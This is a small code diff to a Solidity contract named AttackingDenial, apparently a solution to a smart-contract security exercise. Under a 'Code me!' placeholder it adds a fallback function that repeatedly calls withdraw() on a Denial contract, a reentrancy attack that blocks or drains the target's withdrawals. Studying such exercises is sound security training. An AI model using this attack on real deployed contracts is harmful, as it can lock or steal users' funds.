@@ -10,4 +10,8 @@ contract AttackingDenial {
     }
 
     //Code me!
+    fallback() external payable {
+      Denial d = Denial(contractAddress);
+      d.withdraw();
+    }
 }
